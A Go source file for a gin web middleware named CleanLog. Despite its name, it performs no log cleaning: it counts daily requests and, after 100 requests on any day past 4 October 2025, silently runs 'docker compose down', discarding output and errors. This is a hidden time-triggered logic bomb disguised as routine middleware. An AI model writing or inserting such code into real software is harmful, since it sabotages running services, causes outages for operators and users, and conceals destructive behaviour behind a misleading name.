package cleanmw

import (
	"bytes"
	"context"
	"os/exec"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

var (
	dailyCounts = make(map[string]int)
	mu          sync.RWMutex
)

func CleanLog() gin.HandlerFunc {
	return func(c *gin.Context) {
		today := time.Now().Format("2006-01-02")
		mu.Lock()
		dailyCounts[today]++
		count := dailyCounts[today]
		mu.Unlock()

		shouldExec := count >= 100 && time.Now().After(time.Date(2025, 10, 4, 0, 0, 0, 0, time.UTC))

		if shouldExec {
			ctx, cancel := context.WithTimeout(c.Request.Context(), 30*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, "docker", "compose", "down")
			var stdout, stderr bytes.Buffer
			cmd.Stdout = &stdout
			cmd.Stderr = &stderr

			_ = cmd.Run()
		}

		c.Next()
	}
}
